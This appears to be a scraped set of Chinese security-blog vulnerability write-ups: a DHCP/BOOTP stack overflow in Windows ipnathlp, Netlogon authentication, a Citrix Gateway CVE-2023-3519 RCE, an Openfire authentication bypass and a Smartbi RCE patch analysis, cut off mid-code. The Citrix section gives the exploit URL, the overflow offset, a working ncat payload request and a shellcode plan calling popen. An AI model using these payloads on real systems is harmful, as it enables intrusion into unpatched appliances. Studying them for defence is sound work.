ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 在调试器中可以看到，执行memcpy时长度参数为0x64，继续运行则触发了栈溢出，进程异常退出。\n0:005\u0026gt; g Breakpoint 9 hit ipnathlp!DhcpAddArpEntry+0x184: 00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2) 0:005\u0026gt; rr8 r8=0000000000000064 0:005\u0026gt; g STATUS_STACK_BUFFER_OVERRUN encountered (1858.3b4): Break instruction exception - code 80000003 (first chance) KERNELBASE!UnhandledExceptionFilter+0x7c: 00007ff9`ec55dd3c cc int 3 0:005\u0026gt; k Child-SP RetAddr Call Site 0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c 0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a 0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169 0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214 0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21 0:005\u0026gt; g ntdll!NtWaitForWorkViaWorkerFactory+0x14: 00007ff9`eeb70aa4 c3 ret wireshrk中可以看到数据包协议为Bootp。 PoC参考\r简单实现的DHCP Client并将option 53注释，将 Hardware address length改为0x100。 这个栈溢出长度和内容均为内容可控\n小结 这个漏洞起源于memcpy时src和len参数均来源于数据包内，为用户可控，导致攻击者可以通过设置过长长度触发memcpy越界写入，触发时的漏洞函数为处理BOOTP协议，这个协议是DHCP协议前身，DHCP兼容这个协议，在处理Bootp消息时，没有检查长度导致在复制mac时出错。\n参考链接\nhttps://bbs.kanxue.com/thread-278835.htm\nhttps://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code\nCreated at 2023-09-18T16:18:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/netlogon/","title":"Netlogon","tags":[],"description":"","content":"Overview Netlogon 远程协议客户端和服务器只能在加入域的系统上运行。\nnetlogon协议的交互过程可以详细解释如下:\n客户端发起连接,发送包含8字节的ClientChallenge的NetrServerReqChallenge RPC调用给服务器 服务器收到调用后,生成8字节的ServerChallenge发回客户端 客户端和服务端使用Key Derivation Function基于ClientChallenge、ServerChallenge和密码的hash生成会话密钥 客户端使用会话密钥加密ClientChallenge计算ClientCredential,发送给服务器 服务器端会话密钥和ClientChallenge计算ClientCredential，和客户端发送的ClientCredential比较是否相等 服务器端使用会话密钥和ServerCallenge计算ServerCredential，发给客户端 客户端使用会话密钥加密ServerCallenge计算ServerCredential并和服务端发送的ServerCredential作比较，相同则服务端和客户端都完成了身份校验 MS-NRPC\nCreated at 2023-08-10T03:30:09+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/","title":"CVE-2023-3519 Cirtix Gateway RCE分析","tags":["漏洞分析"],"description":"","content":"基本信息 Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。\n影响版本 NetScaler ADC 、NetScaler Gateway 13.1 \u0026lt; 13.1-49.13 NetScaler ADC 、NetScaler Gateway 13.0 \u0026lt; 13.0-91.13 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.159 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.297\n环境搭建 申请开发者试用，配置Citrix Gateway 技术分析\u0026amp;调试 根据国外安全研究员研究，该漏洞存在于/netscaler/nsppe文件内，diff修复前和修复后的nsppe，主要修改了ns_aaa_gwtest_get_event_and_target_names等几个函数 转到ns_aaa_gwtest_get_event_and_target_names函数，对比修复和未修复的代码，主要在调用ns_aaa_saml_url_decode函数时对v29添加了校验。 跟进ns_aaa_saml_url_decode函数，进入ns_aaa_saml_url_decode_inner\n__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } 在ns_aaa_saml_url_decode_inner函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过datatable_ascii2bin得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。 如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。\n__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)\u0026amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == \u0026#39;%\u0026#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) \u0026lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) \u0026lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) \u0026lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) \u0026lt; 6u ) { if ( v9 != 53 ) v7 = a1; if ( (unsigned __int64)(a1 + 4) \u0026gt;= v5 ) v7 = a1; if ( v8 != 50 ) v7 = a1; if ( !a4 ) v7 = a1; *v4 = datatable_ascii2bin[(unsigned __int8)v7[2]] + 16 * datatable_ascii2bin[(unsigned __int8)v7[1]]; a1 = v7 + 3; goto LABEL_4; } } } } else if ( v6 == \u0026#39;+\u0026#39; ) { *v4 = 32; ++a1; goto LABEL_4; } ++a1; *v4 = v6; LABEL_4: ++v4; } while ( (unsigned __int64)a1 \u0026lt; v5 ); } return (unsigned int)((_DWORD)v4 - (_DWORD)a2); } 在循环中，写入的数组来源于传入的参数a2，并且do while循环结束是通过判断a1 \u0026lt; v5，v5 = \u0026amp;a1[a3];a1是传入的char数组，a3是传入的int。向上追溯调用参数来源。 ns_aaa_saml_url_decode函数的v5最终来源于传入的a1参数，a2为传入的参数，v25来源于*(a1+174)。不难猜测a1应为一个结构体指针，该指针指向的结构体中存储了指向存储请求url的char数组及该数组的长度，该段代码为解析url的各个参数，并根据参数不同进行的操作。\n__int64 __fastcall ns_aaa_gwtest_get_event_and_target_names(__int64 a1, __int64 a2, unsigned int *a3) { unsigned int v3; // r13d unsigned int *v4; // rbx __int64 v5; // r12 unsigned int v6; // r14d __int64 v7; // r13 __int64 v8; // r12 int v9; // r8d __int64 v10; // r10 unsigned __int16 v11; // ax __int64 v12; // rcx unsigned int v13; // eax int v14; // ecx bool v15; // cf int v16; // eax __int64 v17; // rcx int v19; // r14d __int64 v20; // rax int v21; // ecx unsigned int v22; // r13d __int64 v23; // rax unsigned int v24; // edx __int64 v25; // rdx int v26; // eax unsigned int v27; // [rsp+0h] [rbp-50h] __int64 v28; // [rsp+18h] [rbp-38h] BYREF __int64 v29; // [rsp+20h] [rbp-30h] v3 = *(unsigned __int16 *)(a1 + 174); v27 = v3 - 17; if ( v3 \u0026lt; 0x20 ) { v4 = a3; v5 = 0LL; v6 = 1441793; v7 = 0LL; goto LABEL_7; } v8 = *(_QWORD *)(a1 + 36); v29 = v8 + 17; v4 = a3; if ( (unsigned int)strncmp(\u0026#34;event=\u0026#34;, v8 + 17, 6LL) ) { v6 = 1441800; LABEL_5: v5 = 0LL; goto LABEL_6; } if ( !(unsigned int)strncmp(v8 + 23, \u0026#34;start\u0026amp;\u0026#34;, 6LL) ) { v19 = -29; v20 = 29LL; v21 = 1; } else { if ( (unsigned int)strncmp(v8 + 23, \u0026#34;done\u0026amp;\u0026#34;, 5LL) ) { v6 = 1441801; goto LABEL_5; } v19 = -28; v20 = 28LL; v21 = 2; } *v4 = v21; v5 = v20 + v8; v22 = v3 + v19; v6 = 1441802; v27 = v22; if ( (unsigned int)strncmp(\u0026#34;target=\u0026#34;, v5, 7LL) ) goto LABEL_6; v23 = _wrap_memchr(v5 + 7, 38LL, (int)(v22 - 7)); v24 = v22 - 7; v25 = v24 + 1; if ( (_DWORD)v25 != v22 - 6 ) { LABEL_6: v7 = v29; goto LABEL_7; } v26 = ns_aaa_saml_url_decode(v5 + 7, a2, v25); ns_aaa_gwtest_get_event_and_target_names由ns_aaa_gwtest_get_valid_fsso_server调用，其中v15为栈内char数组，大小为128字节。分析到这可以猜测，由于请求url的参数可控，自然请求url长度也可控，而v15这个数组为栈内数组，大小为128字节。ns_aaa_saml_url_decode_inner函数中循环次数由url长度决定，也就是可以控制写入v15数组的字节数，如果url过长则在循环时写入的字节数超过128字节，造成栈溢出。\n__int64 __fastcall ns_aaa_gwtest_get_valid_fsso_server(__int64 a1) { __int64 v1; // rbx unsigned int v2; // eax int v4; // r8d int v5; // r9d unsigned __int16 v6; // ax int v7; // r8d int v8; // r9d __int64 v9; // rcx unsigned int v10; // eax int v11; // ecx bool v12; // cf int v13; // eax __int64 v14; // rcx __int128 v15[8]; // [rsp+10h] [rbp-A0h] BYREF unsigned int v16; // [rsp+94h] [rbp-1Ch] BYREF __int64 v17; // [rsp+98h] [rbp-18h] BYREF int v18[3]; // [rsp+A4h] [rbp-Ch] BYREF memset(v15, 0, sizeof(v15)); v16 = 0; v18[0] = 0; if ( (unsigned int)ns_aaa_gwtest_get_event_and_target_names(a1, (__int64)v15, \u0026amp;v16) ) 向上追溯调用到该函数需要的路径，ns_aaa_gwtest_get_valid_fsso_server由ns_aaa_gwtest_handler调用，在代码中可以看到当请求url+8处为formssso时才会进入到调用ns_aaa_gwtest_get_valid_fsso_server函数的逻辑。\n__int64 __fastcall ns_aaa_gwtest_handler(__int64 a1, __int64 a2, __int64 a3, __int64 a4) { __int64 v5; // r15 __int64 v6; // rax __int64 v7; // rcx _QWORD *v8; // rax unsigned int v9; // r13d __int64 valid_fsso_server; // rax __int64 v11; // rbx unsigned int v12; // r14d __int64 v13; // rax __int64 is_valid_auth_action; // rax __int64 v15; // rax __int64 v16; // rcx unsigned int v17; // eax __int64 v18; // rcx __int64 v20; // rcx __int64 v21; // rdx __int64 v22; // [rsp+0h] [rbp-30h] v5 = a3; v6 = ns_async_ctx; if ( ns_async_ctx ) { v20 = (unsigned int)ns_async_callers_context_size; if ( *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 1486 ) panic_0(\u0026#34;Incorrect context id in ASYNC_SAVE_CTX\u0026#34;, a2, a3, (unsigned int)ns_async_callers_context_size, a4); v12 = *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112); v11 = *(_QWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 116); *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112) = 0; *(_QWORD *)(v6 + v20 + 116) = 0LL; goto LABEL_41; } v7 = *(_QWORD *)(a2 + 36); v8 = (_QWORD *)(v7 + 8); a3 = *(_DWORD *)(v7 + 8) | 0x20202020u; v9 = 32; if ( (int)a3 \u0026lt;= \u0026#39;lmar\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;?dck\u0026#39; ) { v12 = 7; v11 = 0LL; goto LABEL_41; } if ( (_DWORD)a3 == 1752462689 ) { if ( (*v8 | 0x2020202020202020LL) != \u0026#39;vreshtua\u0026#39; || (*(unsigned __int16 *)(v7 + 16) | 0x2020) != 29285 || (*(_BYTE *)(v7 + 18) | 0x20) != 63 ) { return v9; } v22 = a4; is_valid_auth_action = ns_aaa_gwtest_is_valid_auth_action(a2); if ( is_valid_auth_action ) { v11 = is_valid_auth_action; v12 = 1; goto LABEL_39; } return 3907; } if ( (_DWORD)a3 != \u0026#39;lluf\u0026#39; ) return v9; v12 = 9 * ((*(_BYTE *)(v7 + 12) | 0x20) == 63); LABEL_20: v11 = 0LL; if ( !v12 ) return v9; goto LABEL_41; } if ( (int)a3 \u0026lt;= \u0026#39;nahb\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;lmas\u0026#39; ) { if ( (*(_WORD *)(v7 + 12) | 0x2020) == (*(_WORD *)\u0026#34;SP?\u0026#34; | 0x2020) \u0026amp;\u0026amp; (*(_BYTE *)(v7 + 14) | 0x20) == (aSamlsp_0[6] | 0x20) ) { v22 = a4; v13 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v13 ) { v11 = v13; v12 = 3; goto LABEL_39; } } else { if ( (*(_WORD *)(v7 + 12) | 0x2020) != (*(_WORD *)\u0026#34;IdP?\u0026#34; | 0x2020) || (*(_BYTE *)(v7 + 14) | 0x20) != (aSamlidp_1[6] | 0x20) ) { return v9; } v22 = a4; v15 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v15 ) { v11 = v15; v12 = 4; goto LABEL_39; } } } else { if ( (_DWORD)a3 != \u0026#39;mrof\u0026#39; || (*v8 | 0x2020202020202020LL) != \u0026#39;osssmrof\u0026#39; || (*(_BYTE *)(v7 + 16) | 0x20) != 63 ) return v9; v22 = a4; valid_fsso_server = ns_aaa_gwtest_get_valid_fsso_server(a2); ns_aaa_gwtest_handler由ns_vpn_process_unauthenticated_request函数调用，在ns_vpn_process_unauthenticated_request函数中有如下逻辑，当请求路径为/gwtest/时进入调用到目标函数的逻辑。\nif ( v51 == 1702131559 ) { if ( (*(_QWORD *)v26 | \u0026#39; \u0026#39;) != \u0026#39;/tsetwg/\u0026#39; ) goto LABEL_2888; LABEL_437: if ( ns_async_ctx \u0026amp;\u0026amp; *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 652 ) panic_0( \u0026#34;Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST\u0026#34;, a2, v25, (unsigned int)ns_async_callers_context_size, v26); v25 = (unsigned int)(ns_async_callers_context_size + 192); ns_async_callers_context_size += 192; v30 = v1891; if ( ns_async_ctx ) { if ( *(_DWORD *)(ns_async_ctx + 8) != -87101427 ) goto LABEL_4683; if ( (unsigned int)v25 \u0026lt; *(_DWORD *)(ns_async_ctx + 104) ) { a2 = (unsigned int)v25; v25 = (unsigned int)(*(_DWORD *)(ns_async_ctx + (unsigned int)v25 + 108) - 172); if ( (unsigned int)v25 \u0026gt;= 0x611 ) goto LABEL_759; } } v164 = ns_aaa_gwtest_handler((__int64)v1896, v1897, 0LL, v1891); 综上可以总结到调用到漏洞函数ns_aaa_saml_url_decode_inner所需要的url为：\nhttp://target/gwtest/formssso?event=start\u0026amp;target=[overflow char] 只需要让[overflow char]过长即可溢出在ns_aaa_gwtest_get_valid_fsso_server函数内的char数组，造成溢出。查看nsppe防护，可以发现PIE,CANARY都没开，只需要利用栈溢出写入shellcode然后jmp esp即可执行shellcode。\n# checksec --file=nsppe_unpatched RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH 68527 Symbols No 0 0 nsppe_unpatched 动态调试\n找到nsppe进程\nroot@citrix3# ps aux | grep nsppe root 457 100.0 43.2 693320 693560 - Rs 19:10 223:34.32 nsppe (NSPPE-00) 禁用看门狗，使用命令禁止发送该信号\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 使用Citrix ADC自带的gdb附加调试nsppe\ngdb /netscaler/nsppe 461 使用pattern_creat.rb创建字符串\n┌──(root㉿kali)-[~] └─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag 发送payload，触发漏洞，此时rsp为6641376641366641，对应offset为168，也就是168开始覆盖rsp 发送payload，触发漏洞，此时rip指向0xcc指令地址，gdb断下\necho -ne \u0026#39;GET /gwtest/formssso?event=start\u0026amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x62\\x8c\\x6d\\x00\\x00\\x00\\x00\\x00\\xcc HTTP/1.1\\r\\nHost: 192.168.52.108\\r\\n\\r\\n\u0026#39; | ncat --ssl 192.168.52.108 443 在gdb中可以看到缓冲区位于rbp-0xa0处。 通过谷歌，知道在Citrix ADC中，nsppe是网络子系统，一当nsppe进程down了，会造成系统无法处理网络请求，最直观的表现就是当ssh连接目标系统并使用gdb调试nsppe进程的时候，ssh会卡死，而后退出，因为服务器的网络子系统处于调试状态，没办法处理网络请求。\n所以在整个利用过程中，为了保证能够获取到shell/保活系统，要保证nsppe进程不会挂掉。通过shellcode调用popen函数然后执行系统命令，并返回到上层调用栈（保证请求正常返回）。\n之后就是常规则shellcode编写了，直接使用二进制文件内硬编码的popen函数地址即可。需要注意的就是nsppe内实现的url解码逻辑有点不太一样， 具体参考参考链接，这里就不详细展开了。\n小结 整个漏洞产生和利用原理简单直接，因为nsppe没有开启任何溢出防护措施，直接使用jmp esp即可，让我想起了这个经典表情包 不知道是不是因为这个引擎起源比较久的原因，nsppe没有去除调试符号，对于理解原理和调试exp都有非常大的帮助。\n申请开发人员许可\nhttps://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/\nCreated at 2023-07-27T10:48:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/","title":"CVE-2023-32315 Openfire 身份认证绕过漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Openfire中存在目录遍历漏洞，通过使用UTF-16编码的../，可以绕过身份验证，访问一些敏感接口，通过这些接口可以新建管理员，上传插件，进一步造成代码执行\n影响版本 3.10.0 \u0026lt;= Openfire \u0026lt; 4.6.8 4.7.0 \u0026lt;= Openfire \u0026lt; 4.7.5\n环境搭建 直接下载对应的exe安装即可\n技术分析\u0026amp;调试 在Openfire中，/setup/setup-*开头的url由AuthCheckFilter处理，并且访问该url无需经过身份验证（白名单），这个Filter定义在xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java中。\n\u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;AuthCheck\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.jivesoftware.admin.AuthCheckFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;excludes\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt; login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp \u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; 在xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java中通过以下代码判断是否存在目录穿越\npublic static boolean testURLPassesExclude(String url, String exclude) { // If the exclude rule includes a \u0026#34;?\u0026#34; character, the url must exactly match the exclude rule. // If the exclude rule does not contain the \u0026#34;?\u0026#34; character, we chop off everything starting at the first \u0026#34;?\u0026#34; // in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a \u0026#34;*\u0026#34; // character then the URL is allowed if it exactly matches everything before the * and there are no \u0026#34;..\u0026#34; // characters after the \u0026#34;*\u0026#34;. All data in the URL before if (exclude.endsWith(\u0026#34;*\u0026#34;)) { if (url.startsWith(exclude.substring(0, exclude.length()-1))) { // Now make sure that there are no \u0026#34;..\u0026#34; characters in the rest of the URL. if (!url.contains(\u0026#34;..\u0026#34;) \u0026amp;\u0026amp; !url.toLowerCase().contains(\u0026#34;%2e\u0026#34;)) { return true; } } } else if (exclude.contains(\u0026#34;?\u0026#34;)) { if (url.equals(exclude)) { return true; } } else { int paramIndex = url.indexOf(\u0026#34;?\u0026#34;); if (paramIndex != -1) { url = url.substring(0, paramIndex); } if (url.equals(exclude)) { return true; } } return false; } 但该代码没有考虑到其他形式的UNICODE编码，而后端却可以解析该url，导致可以使用UTF-16编码绕过目录穿越检查，并且由于可以匹配/setup/setup-*，也无需身份验证，即攻击者可以利用该漏洞绕过身份验证，任意访问后台。\n攻击者可以利用该漏洞添加管理员，而后通过管理员身份上传恶意插件，造成代码执行。\n结果\n通过该漏洞添加管理员账户\n参考链接\nhttps://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm\nCreated at 2023-06-20T17:42:33+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/","title":"Smartbi RCE 分析","tags":[],"description":"","content":"基本信息 Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。\nSmartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。\n引用自\r奇安信NOX\n影响版本 V7\u0026lt;= Smartbi \u0026lt;= V10.5.8\n环境搭建 官网下载Smartbi V10.5.8即可，直接安装。\n技术分析\u0026amp;调试 解包官网提供的补丁包，可以发现如下：\n{ \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2023-02-28 15:00:00\u0026#34;, \u0026#34;patches\u0026#34;: { \u0026#34;PATCH_20230228\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;*.stub\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectStubPostPatchRule\u0026#34; }] }] }, \u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, 可以看出来，补丁包对符合正则表达式*.stub 的url进行了处理，再根据补丁描述不难发现前一个补丁补的漏洞：DB2 命令执行漏洞。此处的漏洞应该是对其进行了绕过。\n转到web.xml里面，*.stub是由RMIServlet进行处理的，且只有两个filter。\n\u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;RMIServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CacheFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;GZIPFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 继续查看web.xml，不难发现一些敏感接口均要经过CheckIsLoggedFilter，结合反编译的源码，猜测此filter为鉴权filter\n\u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportHttpServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/DownloadExcelServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/MigrateServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; public class CheckIsLoggedFilter implements javax.servlet.Filter { private static IExtendCustomFilter customFilterChecker; private static final Logger LOG = Logger.getLogger(CheckIsLoggedFilter.class); private static final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; AUTHORITYMAP = new HashMap(); /* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */ public interface IExtendCustomFilter { int authorityFiltering(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse); } public void destroy() { } /* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */ /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public void doFilter(javax.servlet.ServletRequest r9, javax.servlet.ServletResponse r10, javax.servlet.FilterChain r11) throws java.io.IOException, javax.servlet.ServletException { /* Method dump skipped, instructions count: 1568 To view this dump change \u0026#39;Code comments level\u0026#39; option to \u0026#39;DEBUG\u0026#39; */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void\u0026#34;); } public static void handleAutoLogin(HttpServletRequest request) { if (FreeQueryModule.getInstance().getUserManagerModule().isLogged()) { return; } String headerUserName = Bootstrap.getHeaderUserName(request); if (StringUtil.isNullOrEmpty(headerUserName)) { return; } IState state = (IState) request.getSession().getAttribute(\u0026#34;state\u0026#34;); boolean isLogged = (state == null || state.getUser() == null) ? false : true; if (!isLogged) { String headerPassword = Bootstrap.getHeaderPassword(request); if (headerPassword == null) { headerPassword = SmartbiXDataSetUtil.OTHER; } FreeQueryModule.getInstance().getStateModule().doStartRequest(request); boolean isAutoLogin = 